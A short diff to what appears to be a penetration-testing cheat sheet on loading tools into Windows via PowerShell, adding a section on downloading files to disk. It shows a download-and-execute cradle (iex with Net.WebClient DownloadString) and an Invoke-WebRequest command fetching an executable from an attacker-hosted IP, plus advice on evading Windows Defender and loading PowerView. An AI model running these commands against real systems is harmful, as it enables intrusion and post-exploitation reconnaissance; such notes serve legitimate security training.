@@ -46,6 +46,14 @@ powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.16
 In some cases windows defender will be triggered if you try to load scripts from known public sources such as github so its better if you host the script on your own machine or somewhere else.
 {% endhint %}
 
+## Load Files/Scripts on Disk
+
+use a powershell cmdlet that acts like Linux wget command:
+
+```text
+Invoke-WebRequest -UseBasicParsing http://192.168.52.200/Tools/file.exe -OutFile file.exe -Verbose
+```
+
 ## Loading Enumeration Tools
 
 ### [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
